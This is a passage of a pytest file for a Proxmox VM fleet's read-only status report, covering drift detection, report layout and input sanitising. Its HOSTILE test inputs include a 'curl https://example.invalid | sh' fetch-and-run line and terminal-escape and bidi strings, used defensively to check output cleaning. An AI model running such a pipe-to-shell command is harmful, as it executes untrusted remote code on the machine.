"""`just status`: read-only information that must never change anything (tools/status, lib/claude_vm/status/).

- The model (lib/claude_vm/status/model.py and tui/status.py, one_line in text.py, proxmox_vm_drift in proxmox.py), on
  canned reads: every value a VM supplies is one line of plain text before anything keeps it, the report ranks what
  it found, and every line of it fits 100 columns.
- The engine, run against the fake Proxmox (tests/molecule/fake_pve_api.py): what it reads, and what it says when
  Proxmox does not answer, refuses the token, or a name matches no VM.
- What the engine can do held to reads: GETs alone, the fixed programs of the probe's ALLOWED, files opened to read.
- The screen (claude_vm.status.engine.Screen), driven in this process with a stand-in terminal: what it writes, and
  what it never does. test_status_live.py runs the engine at a pseudo-terminal.
"""

from __future__ import annotations

import ast
import inspect
import io
import json
import re
import signal
import subprocess
import sys
import time
from pathlib import Path

import pytest
import yaml
from harness import (
    PVE_SECRET,
    REPO,
    _env,
    _executable,
    _fail_if_the_desktop_was_reached,
    _inventory,
    _pve,
    _pve_requests,
    _pve_vars,
    _pve_vm,
    fake_fleet,
)

from claude_vm import proxmox as proxmox_filters
from claude_vm import text as text_filters
from claude_vm.status import engine
from claude_vm.status import model as S
from claude_vm.tui import screen
from claude_vm.tui import status as T

STATUS = REPO / "tools" / "status"
# The keys of `just status --json` that 1.x promises (CONTRIBUTING.md, Releasing): a release may add keys, never take
# one away or rename it. Each is held where the report has it.
PROMISED_KEYS = {
    "report": {
        "attention",
        "counts",
        "exit",
        "live",
        "now",
        "others",
        "proxmox",
        "read_at",
        "sections",
        "settings",
        "storages",
        "goldens",
        "template",
        "title",
        "vms",
    },
    "vm": {
        "address",
        "alias",
        "api",
        "config",
        "own_repos",
        "cpu",
        "created",
        "created_ago",
        "drift",
        "maxdisk",
        "maxmem",
        "mem",
        "mem_source",
        "mem_total",
        "mem_used",
        "min_mem",
        "name",
        "needs_ssh",
        "node",
        "os",
        "pending_api",
        "pending_ssh",
        "read",
        "root",
        "skipped",
        "ssh",
        "state",
        "status",
        "unfinished",
        "uptime",
        "vcpus",
        "vmid",
    },
    "attention": {"command", "level", "source", "subject", "text", "vm"},
    "proxmox": {"nodes", "unread", "version"},
    "template": {"built", "built_ago", "ctime", "drift", "name", "node", "rebuild", "storage", "vmid"},
    "settings": {"aliases_enabled", "editor", "names", "nic", "tag", "tailscale_enabled", "vm_user", "vpn"},
    # Each VM's reads over SSH, and of them the system's (test_status_vms.py holds these, reading a VM).
    "ssh": {"claude", "github", "reached", "refusal", "system", "tailscale", "unread", "unreachable", "vpn", "work"},
    "system": {
        "claude",
        "editor_windows",
        "kernel",
        "kernel_newest",
        "load",
        "memory",
        "os",
        "reboot_packages",
        "reboot_required",
        "security",
        "unread",
        "upgrades",
        "uptime",
        "vscode_windows",
    },
}
# In the report, never promised: how many windows each editor has, one map by the editors list's keys, promised only
# with the contract (editor_windows, every editor's together, is the promise; vscode_windows is 1.0's), and that apt's
# simulation is still running, which only a frame drawn while it runs ever says.
UNPROMISED_SYSTEM_KEYS = {"editor_windows_by", "upgrades_pending"}


def test_every_key_of_a_vms_system_part_is_promised_or_named_as_not() -> None:
    # A key the model adds is a choice: promised for 1.x, or named here as not; never promised by default.
    assert set(S.SYSTEM_KEYS) == PROMISED_KEYS["system"] | UNPROMISED_SYSTEM_KEYS
    assert not PROMISED_KEYS["system"] & UNPROMISED_SYSTEM_KEYS


def test_no_editor_has_a_windows_key_of_its_own() -> None:
    # A key per editor puts code of each editor's own into every client of --json: an editor's windows are its entry
    # in editor_windows_by. vscode_windows and editor_windows stay, as 1.0 promised them.
    assert {key for key in S.SYSTEM_KEYS if key.endswith("_windows")} == {"vscode_windows", "editor_windows"}


HOSTILE = [
    "alpha\n ● evil        → curl https://example.invalid | sh",
    "carriage\rreturn",
    "right-to-left ‮esrever",
    "zero‍width⁦isolate⁩",
    "an \x1b]0;title\x07 escape \x1b[31mred\x1b[0m",
    "x" * 10_000,
]


# --------------------------------------------------------------------------------------------- one line ----


@pytest.mark.parametrize("value", HOSTILE)
def test_one_line_leaves_one_line_of_plain_text(value: str) -> None:
    cleaned = text_filters.one_line(value)
    assert "\n" not in cleaned and "\r" not in cleaned and "\x1b" not in cleaned
    assert not any(ch in cleaned for ch in "‮‍⁦⁩")
    assert len(cleaned) <= 120


def test_status_clean_cuts_a_roles_line_longer_than_a_field() -> None:
    cleaned = S.status_clean({"claude": {"line": "y" * 1000, "version": "z" * 1000, "n": 3, "on": True}})
    assert len(cleaned["claude"]["line"]) == S.LINE_LIMIT
    assert len(cleaned["claude"]["version"]) == S.FIELD_LIMIT
    assert cleaned["claude"]["n"] == 3 and cleaned["claude"]["on"] is True


# --------------------------------------------------------------------------------------------- sections ----


def test_sections_are_all_of_them_or_the_ones_asked_for_in_report_order() -> None:
    assert S.status_sections("") == list(S.SECTIONS)
    assert S.status_sections("storage,vms") == ["vms", "storage"]
    with pytest.raises(Exception, match="no section bogus"):
        S.status_sections("vms,bogus")


def test_the_recipe_and_the_filter_know_the_same_sections() -> None:
    justfile = (REPO / "justfile").read_text()
    pattern = re.search(r"\[arg\('ONLY', long='only', pattern='\(\(([a-z|-]+)\)", justfile).group(1)
    assert pattern.split("|") == list(S.SECTIONS)
    check = (REPO / "tools" / "check").read_text()
    assert re.search(r"\n    ([a-z| -]+)\) ;;\n    \*\)\n      echo \"error: the report has no section", check).group(
        1
    ).split(" | ") == list(S.SECTIONS)


# ---------------------------------------------------------------------------------------- settings drift ----

CONFIG = {
    "cores": "2",
    "memory": "4096",
    "balloon": "4096",
    "onboot": "1",
    "scsi0": "local-lvm:vm-100-disk-0,discard=on,size=32G",
    "ciuser": "dev",
    "sshkeys": "ssh-ed25519%20AAAA%20dev%40mac%0A",
    "ipconfig0": "ip=dhcp",
}
WANTED = {
    "cores": 2,
    "memory": 4096,
    "balloon": 4096,
    "onboot": True,
    "disk": "32G",
    "ciuser": "dev",
    "sshkeys": ["ssh-ed25519 AAAA dev@mac"],
    "ipconfig0": "ip=dhcp",
    "nameserver": [],
    "searchdomain": "",
}


def test_a_vm_as_deploy_left_it_has_no_drift() -> None:
    assert proxmox_filters.proxmox_vm_drift(CONFIG, WANTED) == {"hardware": [], "cloud_init": []}


def test_drift_names_each_hardware_setting_and_what_differs_in_cloud_init() -> None:
    drift = proxmox_filters.proxmox_vm_drift(
        CONFIG, {**WANTED, "cores": 4, "memory": 8192, "balloon": 8192, "sshkeys": ["ssh-ed25519 BBBB new"]}
    )
    assert [d["setting"] for d in drift["hardware"]] == ["cores", "memory", "balloon"]
    assert drift["cloud_init"] == ["SSH keys"]


def test_a_disk_is_compared_in_bytes_and_only_when_smaller() -> None:
    # Proxmox stores 1024G as 1T: a string comparison would call that a difference on every run.
    same = proxmox_filters.proxmox_vm_drift({**CONFIG, "scsi0": "x:y,size=1T"}, {**WANTED, "disk": "1024G"})
    assert same["hardware"] == []
    grown = proxmox_filters.proxmox_vm_drift({**CONFIG, "scsi0": "x:y,size=64G"}, WANTED)
    assert grown["hardware"] == []
    small = proxmox_filters.proxmox_vm_drift(CONFIG, {**WANTED, "disk": "64G"})
    assert small["hardware"] == [{"setting": "disk", "wanted": 64 * 1024**3, "has": 32 * 1024**3}]


def test_a_config_not_read_has_no_drift() -> None:
    assert proxmox_filters.proxmox_vm_drift({}, WANTED) == {"hardware": [], "cloud_init": []}


def test_a_fixed_allocation_says_its_memory_once_and_force_update_says_what_else_it_does() -> None:
    vm = {"name": "alpha"}
    drift = {
        "hardware": [
            {"setting": "memory", "wanted": 8192, "has": 4096},
            {"setting": "balloon", "wanted": 8192, "has": 4096},
        ],
        "cloud_init": [],
    }
    item = S._drift_item(vm, drift, {})
    assert item["text"] == "the settings ask for 8.0 GiB of memory; alpha has 4.0 GiB"
    assert "proxmox_vm_force_update=true' deploy alpha --only provision" in item["command"]
    assert "resets alpha's tags" in item["command"] and "cloud-init" not in item["command"]
    cloud = S._drift_item(vm, {"hardware": [], "cloud_init": ["SSH keys"]}, {})
    assert "regenerates its SSH host keys" in cloud["command"]


# ------------------------------------------------------------------------------------------- one VM's API ----


def _result(name, data, status=200):
    return {"item": {"name": name}, "status": status, "json": {"data": data}}


@pytest.mark.parametrize(("step", "count"), [(60, 1440), (1200, 70)])
def test_the_day_reads_as_twelve_buckets_at_either_resolution(step: int, count: int) -> None:
    # Proxmox VE 9 keeps a point a minute, 8 one every twenty minutes.
    now = 1_800_000_000
    points = [{"time": now - 86400 + (i + 1) * step, "cpu": 0.5} for i in range(count)]
    api = S.status_vm_api([_result("rrddata", points)], now)
    assert api["cpu_24h"] == [0.5] * 12


def test_cpu_pressure_is_a_percentage_and_absent_on_proxmox_ve_8() -> None:
    now = 1_800_000_000
    points = [{"time": now - 60 * i, "cpu": 0.1, "pressurecpusome": 25.0} for i in range(60)]
    assert S.status_vm_api([_result("rrddata", points)], now)["pressure_1h"] == 0.25
    assert S.status_vm_api([_result("rrddata", [{"time": now, "cpu": 0.1}])], now)["pressure_1h"] is None


def test_the_root_disk_is_slash_and_a_pending_change_is_named() -> None:
    fsinfo = {
        "result": [
            {"mountpoint": "/boot/efi", "type": "vfat", "used-bytes": 1, "total-bytes": 2},
            {"mountpoint": "/", "type": "ext4", "used-bytes": 10, "total-bytes": 40},
        ]
    }
    pending = [{"key": "cores", "value": 2}, {"key": "memory", "value": 4096, "pending": 8192}]
    api = S.status_vm_api(
        [_result("fsinfo", fsinfo), _result("pending", pending), _result("current", {"status": "running"})]
    )
    assert api["root"] == {"used": 10, "total": 40, "type": "ext4"}
    assert api["pending"] == ["memory"]
    assert api["read"] and api["state"] == "running"


def test_a_read_that_failed_reads_as_nothing() -> None:
    api = S.status_vm_api([_result("current", None, status=500), _result("rrddata", None, status=-1)])
    assert api["read"] is False and api["root"] is None and api["cpu_24h"] == [None] * 12


# ------------------------------------------------------------------------------------------------ fleet ----

LISTING = [
    {
        "vmid": 100,
        "name": "alpha",
        "node": "pve",
        "type": "qemu",
        "status": "running",
        "tags": "agent-warehouse",
        "maxcpu": 2,
        "maxmem": 4 * 1024**3,
        "mem": 1024**3,
        "cpu": 0.1,
        "uptime": 7200,
        "maxdisk": 32 * 1024**3,
    },
    {
        "vmid": 101,
        "name": "beta",
        "node": "pve",
        "type": "qemu",
        "status": "stopped",
        "tags": "agent-warehouse;agent-warehouse-unfinished",
        "maxcpu": 2,
        "maxmem": 4 * 1024**3,
    },
    {"vmid": 102, "name": "twin", "node": "pve", "type": "qemu", "status": "running", "tags": "agent-warehouse"},
    {"vmid": 103, "name": "twin", "node": "pve", "type": "qemu", "status": "running", "tags": "agent-warehouse"},
    {"vmid": 104, "node": "pve2", "type": "qemu", "status": "unknown", "tags": "agent-warehouse"},
    {
        "vmid": 200,
        "name": "stranger",
        "node": "pve",
        "type": "qemu",
        "status": "running",
        "maxcpu": 4,
        "maxmem": 8 * 1024**3,
    },
    {"vmid": 9000, "name": "ubuntu-24.04-cloudinit", "node": "pve", "type": "qemu", "status": "stopped", "template": 1},
    {
        "vmid": 300,
        "name": "ours-container",
        "node": "pve",
        "type": "lxc",
        "status": "running",
        "tags": "agent-warehouse",
    },
]
SETTINGS = {
    "tag": "agent-warehouse",
    "template_name": "ubuntu-24.04-cloudinit",
    "storage": "local-lvm",
    "sections": "",
    "tailscale_enabled": True,
    # As the engine's settings resolve the editor setting's default, and name every editor of the list.
    "editor": "vscode",
    "editor_name": "VS Code",
    "editor_names": {"vscode": "VS Code", "zed": "Zed"},
}


def _tagged(listing=LISTING):
    return [
        e
        for e in listing
        if e.get("type") == "qemu" and re.search(r"(^|[;,])agent-warehouse([;,]|$)", e.get("tags", ""))
    ]


def _fleet(names=(), **kw):
    tagged = _tagged()
    requested = [e for e in tagged if not names or e.get("name") in names]
    return S.status_fleet(
        LISTING, tagged=tagged, requested=requested, settings={**SETTINGS, "names": list(names)}, **kw
    )


def test_golden_templates_and_build_vms_are_counted_from_the_listing() -> None:
    listing = [
        {"vmid": 150, "name": "agent-warehouse-golden-aaaa", "type": "qemu", "template": 1, "node": "pve"},
        {
            "vmid": 151,
            "name": "agent-warehouse-build-bbbb",
            "type": "qemu",
            "tags": "agent-warehouse-build",
            "node": "pve",
        },
        {"vmid": 152, "name": "agent-warehouse-build-cccc", "type": "qemu", "tags": "someones", "node": "pve"},
    ]
    fleet = S.status_fleet(listing, tagged=[], requested=[], settings=SETTINGS)
    assert fleet["goldens"] == {"count": 1, "building": ["agent-warehouse-build-bbbb"]}


def test_the_fleet_is_this_projects_vms_and_the_rest_as_totals() -> None:
    fleet = _fleet()
    assert [vm["vmid"] for vm in fleet["vms"]] == [100, 101, 102, 103, 104]
    assert fleet["others"] == {"count": 1, "vcpus": 4, "mem": 8 * 1024**3, "running": 1, "nodes": ["pve"]}
    by = {vm["vmid"]: vm for vm in fleet["vms"]}
    # A VM is read in play 2 only by a name no other VM carries, that a recipe takes, on a node that answers.
    assert by[100]["read"] and by[101]["read"]
    assert by[102]["skipped"] == by[103]["skipped"] == "duplicate"
    assert by[104]["skipped"] == "node"
    assert by[101]["unfinished"]


def test_a_vm_1x_left_unfinished_is_shown_so_while_its_tag_is_owned() -> None:
    # The listing's tagged VMs come from claude_vm_tag_pattern, which owns the 1.x tag too (test_tailscale.py).
    vm = {"vmid": 105, "name": "half-by-1x", "node": "pve", "type": "qemu", "status": "stopped"}
    vm["tags"] = "claude-on-proxmox;claude-on-proxmox-unfinished"
    owned = {**SETTINGS, "names": [], "tags_owned": ["agent-warehouse", "claude-on-proxmox"]}
    assert S.status_fleet([vm], tagged=[vm], requested=[vm], settings=owned)["vms"][0]["unfinished"]
    # Read under the one tag given, as a tag of one's own is: not this tag's unfinished VM.
    alone = {**SETTINGS, "names": []}
    assert not S.status_fleet([vm], tagged=[vm], requested=[vm], settings=alone)["vms"][0]["unfinished"]


def test_a_name_given_that_matches_nothing_is_said_with_the_nameless_vms_it_may_be() -> None:
    fleet = _fleet(names=["alpah"])
    assert fleet["unmatched"] == ["alpah"]
    assert fleet["nameless"] == [{"vmid": 104, "node": "pve2"}]
    model = S.status_report({"localhost": {"fleet": fleet}}, "now")
    unread = [it for it in model["attention"] if it["level"] == "unread" and it["vm"] == "alpah"]
    assert unread and "104" in unread[0]["text"]
    assert model["exit"] == 2


def test_discovery_off_reads_the_inventorys_vms_and_says_so() -> None:
    fleet = S.status_fleet([], settings={**SETTINGS, "discovery": False})
    model = S.status_report({"localhost": {"fleet": fleet}, "claude-dev": {"x": 1}}, "now")
    assert [vm["name"] for vm in model["vms"]] == ["claude-dev"]
    assert "claude_vm_discovery is off" in model["title"]


def test_proxmox_not_answering_is_one_unread_item_with_the_hint() -> None:
    fleet = S.status_fleet(
        None, settings={**SETTINGS, "proxmox_hint": "check proxmox_api_host"}, unread="Could not list the VMs"
    )
    model = S.status_report({"localhost": {"fleet": fleet}}, "now")
    assert model["exit"] == 2
    assert [(it["level"], it["text"], it["command"]) for it in model["attention"]] == [
        ("unread", "Could not list the VMs", "check proxmox_api_host")
    ]


# ----------------------------------------------------------------------------------------------- report ----


def _model(found_vms=None, live=False, now=1_800_000_000):
    fleet = _fleet()
    found = {"localhost": {"fleet": fleet}, **(found_vms or {})}
    return S.status_report(found, "2026-10-25 14:32 PDT", now, live=live)


def test_unread_outranks_a_problem_and_a_problem_outranks_a_thing_to_do() -> None:
    root_full = {"api": {"read": True, "state": "running", "root": {"used": 95, "total": 100}, "pending": []}}
    model = _model({"alpha": root_full})
    levels = [it["level"] for it in model["attention"]]
    assert levels == sorted(levels, key=S.LEVELS.index)
    assert levels[0] == "unread" and "problem" in levels and "todo" in levels
    assert model["exit"] == 2
    assert model["counts"]["problem"] == 2  # the full root, and the two VMs called twin, said once


def test_a_clone_that_carries_the_templates_ctime_has_no_age() -> None:
    fleet = _fleet()
    fleet["template"] = {"name": "t", "ctime": 1_700_000_000}
    fleet["vms"][0]["created"] = 1_700_000_000
    fleet["vms"][1]["created"] = 1_799_000_000
    model = S.status_report({"localhost": {"fleet": fleet}}, "now", 1_800_000_000)
    assert model["vms"][0]["created_ago"] == ""
    assert model["vms"][1]["created_ago"] == "11 d ago"


def test_a_template_made_from_a_clone_is_dated_by_its_disk() -> None:
    # A golden, or a template of your own made from a clone, carries its source's meta ctime: a golden made minutes
    # before was "built 11 d ago" (live, Proxmox VE 9.2). Its clones carry that ctime too, and still show no age.
    now = 1_800_000_000
    disks = [{"volid": "local-lvm:base-9000-disk-0", "vmid": 9000, "size": 1, "ctime": str(now - 600)}]
    contents = [{"item": {"node": "pve", "storage": "local-lvm"}, "status": 200, "json": {"data": disks}}]
    config = {"status": 200, "json": {"data": {"meta": "creation-qemu=9.2.0,ctime=1799000000"}}}
    fleet = _fleet(contents=contents, template_config=config)
    assert fleet["template"]["built"] == now - 600 and fleet["template"]["ctime"] == 1_799_000_000
    fleet["vms"][0]["created"] = 1_799_000_000
    model = S.status_report({"localhost": {"fleet": fleet}}, "now", now)
    assert model["template"]["built_ago"] == "10 m ago"
    assert model["vms"][0]["created_ago"] == ""
    # With its disk unread - on a storage the run did not list - its config's.
    assert _fleet(template_config=config)["template"]["built"] == 1_799_000_000


def test_a_template_the_next_deploy_rebuilds_is_a_thing_to_do_and_said_on_its_line() -> None:
    drift = ["bridge vmbr0 → vmbr1", "cpu host → x86-64-v2-AES"]
    fleet = _fleet(template_drift=drift)
    assert fleet["template"]["drift"] == drift and fleet["template"]["rebuild"] is True
    model = S.status_report({"localhost": {"fleet": fleet}}, "now", 1_800_000_000)
    (item,) = [it for it in model["attention"] if it["vm"] == "template"]
    assert item["level"] == "todo" and item["command"] == "just deploy --only template rebuilds it now"
    assert item["text"] == (
        "the template ubuntu-24.04-cloudinit differs from its settings (bridge vmbr0 → vmbr1;"
        " cpu host → x86-64-v2-AES), so the next just deploy rebuilds it, over root SSH"
    )
    said = "\n".join(screen.plain(line) for line in T._storage_lines(model))
    assert "ubuntu-24.04-cloudinit (9000) · next deploy rebuilds it" in said, said


def test_a_template_with_no_record_is_said_to_be_refused_never_rebuilt() -> None:
    fleet = _fleet(template_drift=[proxmox_filters.NO_TEMPLATE_RECORD])
    model = S.status_report({"localhost": {"fleet": fleet}}, "now", 1_800_000_000)
    (item,) = [it for it in model["attention"] if it["vm"] == "template"]
    assert "refuses it" in item["text"] and "proxmox_template_rebuild" in item["command"]
    said = "\n".join(screen.plain(line) for line in T._storage_lines(model))
    assert "no record, next deploy refuses it" in said and "rebuilds" not in said, said


def test_a_missing_template_of_your_own_is_not_promised_a_build() -> None:
    fleet = _fleet()
    fleet["template"] = {"name": "mine", "missing": True, "custom": True}
    model = S.status_report({"localhost": {"fleet": fleet}}, "now", 1_800_000_000)
    said = "\n".join(screen.plain(line) for line in T._storage_lines(model))
    assert "mine: not on Proxmox; just deploy refuses" in said and "builds it" not in said, said


def test_a_template_kept_as_it_is_is_no_thing_to_do() -> None:
    settings = {**SETTINGS, "template_rebuild": False, "names": []}
    fleet = S.status_fleet(
        LISTING, tagged=_tagged(), requested=_tagged(), settings=settings, template_drift=["vga std → serial0"]
    )
    model = S.status_report({"localhost": {"fleet": fleet}}, "now", 1_800_000_000)
    assert not [it for it in model["attention"] if it["vm"] == "template"]
    said = "\n".join(screen.plain(line) for line in T._storage_lines(model))
    assert "ubuntu-24.04-cloudinit (9000) · differs, kept" in said, said


def test_every_line_of_the_report_fits_100_columns() -> None:
    fleet = _fleet()
    for vm in fleet["vms"]:
        vm["name"] = (vm["name"] or "n") + "-with-a-very-long-name-indeed"
    model = S.status_report({"localhost": {"fleet": fleet}}, "2026-10-25 14:32 PDT", 1_800_000_000)
    lines = T.status_text(model, reading="read in 8.2 s · proxmox 0.9 s").split("\n")
    assert max(len(line) for line in lines) <= T.WIDTH, max(lines, key=len)


def test_the_access_columns_line_up_whatever_the_names() -> None:
    # An alias padded to 12 and never cut ran into the tailnet column: "sigint-repronot installed".
    def vm(name: str, alias: bool = True, tailscale: dict | None = None) -> dict:
        ssh = {"tailscale": tailscale} if tailscale else {}
        return {
            "name": name,
            "address": "192.0.2.10",
            "alias": alias,
            "needs_ssh": True,
            "state": "running",
            "ssh": ssh,
        }

    running = {"backend": "Running", "dns_name": "duscope-1.tail0000.ts.net", "ipv4": "100.64.0.1"}
    model = {
        "vms": [
            vm("duscope-1", tailscale=running),
            vm("sigint-repro"),
            vm("homeserver-test-13f1a98e"),
            vm("nl1", alias=False),
            vm("a-name-longer-than-any-alias-column"),
        ],
        "settings": {"aliases_enabled": True, "tailscale_enabled": True, "editor_name": "VS Code"},
    }
    lines = [screen.plain(line) for line in T._access_lines(model)]
    column = lines[0].index("TAILNET")
    for line in lines[1:-1]:
        assert line[column - 2 : column] == "  " and line[column] != " ", line
    # Whole up to 24 characters, which ssh takes as they are; a longer one cut as the name column cuts.
    assert lines[3].split()[2] == "homeserver-test-13f1a98e"
    assert lines[5].split()[2] == "a-name-longer-than-any-…"


def test_a_vm_left_on_the_tailnet_under_none_shows_there_unmanaged_and_one_off_shows_off() -> None:
    # Choosing no VPN never removes one: a VM the project put on the tailnet stays there, and the column says so
    # rather than "off" (the probe reads it where the project's marker is).
    def vm(name: str, tailscale: dict | None) -> dict:
        return {
            "name": name,
            "address": "192.0.2.11",
            "needs_ssh": True,
            "state": "running",
            "ssh": {"tailscale": tailscale} if tailscale else {},
        }

    unmanaged = {"case": "unmanaged", "backend": "Running", "dns_name": "alpha.tail0000.ts.net", "ipv4": "100.64.0.1"}
    model = {
        "vms": [vm("alpha", unmanaged), vm("beta", {"case": "off"})],
        "settings": {"aliases_enabled": False, "vpn": "none", "tailscale_off": "vpn is none", "editor_name": "VS Code"},
    }
    lines = [screen.plain(line) for line in T._access_lines(model)]
    assert lines[1].rstrip().endswith("alpha.tail0000.ts.net  100.64.0.1  unmanaged"), lines
    assert lines[2].rstrip().endswith("off: vpn is none"), lines
    assert max(len(line) for line in lines) <= T.WIDTH
    # And SIGN-INS, whose Tailscale cell is that VM's, never "off".
    assert T._tailscale_cell(unmanaged) == ("● unmanaged", "d")
    assert T._tailscale_cell({"case": "off", "enabled": False}) == ("○ off", "d")


def test_the_access_line_names_the_editor_just_code_opens() -> None:
    # Drawn from the model status_report makes, never one made by hand: status_report kept six keys of the settings,
    # and the line said VS Code whatever the editor was.
    def said(settings: dict) -> list[str]:
        fleet = _fleet()
        fleet["settings"].update(settings)
        model = S.status_report({"localhost": {"fleet": fleet}}, "now", 1_800_000_000)
        assert (model["settings"]["editor"], model["settings"]["editor_name"]) == (
            fleet["settings"]["editor"],
            fleet["settings"]["editor_name"],
        )
        return [line for line in T.status_text(model).split("\n") if "just code <name>" in line]

    assert said({"editor": "zed", "editor_name": "Zed"}) == [
        " Zed: just code <name> [--project <repo>] [--session <id>]"
    ]
    assert said({}) == [" VS Code: just code <name> [--project <repo>] [--session <id>]"]


@pytest.mark.parametrize("name", [None, ""])
def test_a_fleet_whose_settings_name_no_editor_fails_the_report(name: str | None) -> None:
    # A .get would put None in the model and draw "None: just code" rather than fail a test.
    fleet = _fleet()
    del fleet["settings"]["editor_name"]
    if name is not None:
        fleet["settings"]["editor_name"] = name
    with pytest.raises(Exception, match="name no editor"):
        S.status_report({"localhost": {"fleet": fleet}}, "now")


def test_the_editor_cell_is_whole_beside_the_longest_name() -> None:
    # A live run cut "1 window" to "1 wind…" beside a 9-letter name: the row ran past 100 columns.
    def vm(name: str, windows: int) -> dict:
        system = {"claude": 1, "editor_windows": windows}
        return {"name": name, "needs_ssh": True, "ssh": {"work": {"checkouts": 24}, "system": system}}

    model = {"vms": [vm("a-thirteen-ch", 10), vm("zed-trial", 1)], "settings": {}}
    lines = [screen.plain(line) for line in T._work_lines(model)]
    assert max(len(line) for line in lines) <= T.WIDTH, max(lines, key=len)
    assert lines[2].endswith("10 windows") and lines[3].endswith("1 window"), lines


def test_a_name_too_long_for_its_column_ends_in_an_ellipsis_in_every_section() -> None:
    # One rule: SIGN-INS, SYSTEM and WORK cut a name at 13 and ATTENTION at 11 without a sign, where VMS and ACCESS
    # ended it in "…" - and a name cut short with no sign reads as another VM's whole one.
    name = "a-name-longer-than-its-column"
    vm = {"name": name, "vmid": 101, "state": "stopped", "address": "192.0.2.10", "needs_ssh": True, "ssh": {}}
    model = {
        "vms": [vm],
        "proxmox": {"nodes": ["pve"]},
        "settings": {"aliases_enabled": False, "tailscale_enabled": False, "editor_name": "VS Code"},
        "counts": {"unread": 0, "problem": 0, "todo": 1},
        "attention": [S._item("todo", name, "x")],
        "now": 1_800_000_000,
    }
    for section in (T._vms_lines, T._access_lines, T._signins_lines, T._system_lines, T._work_lines):
        rows = [screen.plain(line) for line in section(model) if name[:10] in screen.plain(line)]
        assert rows and all(f" {name[:12]}… " in row and name[:13] not in row for row in rows), (section, rows)
    rows = [screen.plain(line) for line in T._attention_lines(model) if name[:10] in screen.plain(line)]
    assert rows and all(f" {name[:10]}… " in row and name[:11] not in row for row in rows), rows


def test_a_hostile_value_never_starts_a_line_of_its_own() -> None:
    fleet = _fleet()
    found = {"localhost": {"fleet": fleet}}
    for i, vm in enumerate(fleet["vms"][:2]):
        found[vm["name"]] = {
            "api": {
                "read": True,
                "state": "running",
                "os": {"pretty": HOSTILE[i % len(HOSTILE)]},
                "root": None,
                "pending": [HOSTILE[0]],
            }
        }
    model = S.status_report(found, HOSTILE[2], 1_800_000_000)
    rendered = T.status_text(model, color=False)
    assert not any(line.startswith(" ● evil") for line in rendered.split("\n"))
    assert "\x1b" not in rendered and "‮" not in rendered and "\r" not in rendered
    # And --json, built from the same cleaned model, holds none of it either.
    dumped = json.dumps(model, ensure_ascii=False)
    assert "\\n ● evil" not in dumped and "‮" not in dumped


def test_a_live_frame_draws_a_spinner_where_a_value_is_pending_and_the_final_one_none() -> None:
    model = _model(live=True)
    frame = T.status_text(model, glyph="⠼")
    assert "⠼" in frame and "ranked once every VM is read" in frame
    final = T.status_text(_model())
    assert T.PENDING not in final and "⠼" not in final and final.split("\n")[-1].startswith("exit ")


# ------------------------------------------------------------------------------------- the engine, faked ----


@pytest.fixture
def fake_pve(tmp_path):
    yield from fake_fleet(tmp_path)


# The ssh every status run in a test is given: it records how it was called, one JSON line each, and refuses with
# what ssh-says holds (ssh's own words for a refused connection, unless a test says otherwise). No test reaches a
# real VM, or this machine's ssh.
SSH = """#!/bin/sh
here=$(dirname "$0")
"$here/python" -c 'import json, sys; print(json.dumps(sys.argv[1:]))' "$@" >> "$here/ssh.log"
# Held while ssh-holds exists, for a minute at most: a live test acts on a frame while the run waits here.
n=0
while [ -f "$here/ssh-holds" ] && [ "$n" -lt 1200 ]; do sleep 0.05; n=$((n + 1)); done
if [ -f "$here/ssh-says" ]; then
  cat "$here/ssh-says" >&2
else
  echo "ssh: connect to host stand-in port 22: Connection refused" >&2
fi
exit 255
"""


def status_root(tmp_path: Path, base: str, settings: dict | None = None) -> Path:
    """A run directory for tools/status against the fake at base, with settings on top."""
    root = tmp_path / "run"
    _pve_vars(
        root,
        base,
        {
            "vm_ssh_public_keys": [],
            # Never the developer's ~/.ssh: the managed file is the test's own.
            "claude_ssh_config_file": str(tmp_path / "ssh.conf"),
            # Never a real ssh: the stand-in refuses as an unreachable VM does.
            "ansible_ssh_executable": str(root / "ssh"),
            "ansible_control_path_dir": str(root / "cp"),
            # apt's simulation is the VM's: this machine has none.
            "status_read_upgrades": False,
            **(settings or {}),
        },
    )
    _executable(root / "ssh", SSH)
    if not (root / "python").exists():
        (root / "python").symlink_to(sys.executable)
    return root


def status_command(root: Path, hosts: dict | None, *extra: str) -> list[str]:
    """tools/status for a run directory, keeping nothing: test_status_settings.py is what asks it to keep."""
    return [sys.executable, str(STATUS), "-i", str(_inventory(root, hosts or {}, False)), *extra]


def _status_run(tmp_path, base, *extra, settings=None, hosts=None, timeout=180, cache=""):
    """tools/status from a run directory of its own, against the fake at base, with hosts in its inventory; returns
    what it did and the report's model. ``rc`` is 0 for a run that gave a report, whatever the report's code."""
    root = status_root(tmp_path, base, settings)
    argv = [*status_command(root, hosts, "--json", *extra), *(("--cache", cache) if cache else ())]
    done = subprocess.run(
        argv,
        cwd=root,
        env=_env(root),
        stdin=subprocess.DEVNULL,
        capture_output=True,
        text=True,
        timeout=timeout,
        check=False,
    )
    _fail_if_the_desktop_was_reached(root)
    report = {"rc": 0 if done.returncode in (0, 1, 2) else done.returncode, "exit": done.returncode}
    report.update(stdout=done.stdout, stderr=done.stderr)
    return report, json.loads(done.stdout) if report["rc"] == 0 else None


def test_status_reads_the_aliases_of_the_managed_file_by_its_1x_name_and_moves_nothing(tmp_path, fake_pve) -> None:
    # Before the first alias write of 2.0 moves it, the aliases are in the 1.x file, beside the new name.
    legacy = tmp_path / "claude-on-proxmox.conf"
    legacy.write_text(
        "# BEGIN claude-on-proxmox: alpha\nHost alpha\n  HostName 192.0.2.60\n# END claude-on-proxmox: alpha\n"
    )
    before = legacy.read_bytes()
    settings = {"claude_ssh_config_file": str(tmp_path / "agent-warehouse.conf")}
    report, model = _status_run(tmp_path, fake_pve, settings=settings)
    assert report["rc"] == 0, report["stderr"][-2000:]
    assert model["vms"][0]["name"] == "alpha" and model["vms"][0]["alias"] is True
    assert legacy.read_bytes() == before and not (tmp_path / "agent-warehouse.conf").exists()


def test_status_reads_the_fleet_from_the_api_and_changes_nothing(tmp_path, fake_pve) -> None:
    (tmp_path / "ssh.conf").write_text(
        "# BEGIN agent-warehouse: alpha\nHost alpha\n  HostName 192.0.2.60\n# END agent-warehouse: alpha\n"
    )
    report, model = _status_run(tmp_path, fake_pve)
    assert report["rc"] == 0, report["stderr"][-2000:]
    names = [vm["name"] for vm in model["vms"]]
    assert names[:3] == ["alpha", "beta", "gamma"]
    alpha = model["vms"][0]
    assert alpha["address"] == "192.0.2.60" and alpha["alias"] is True
    assert model["vms"][1]["alias"] is False
    assert (
        alpha["api"]["read"]
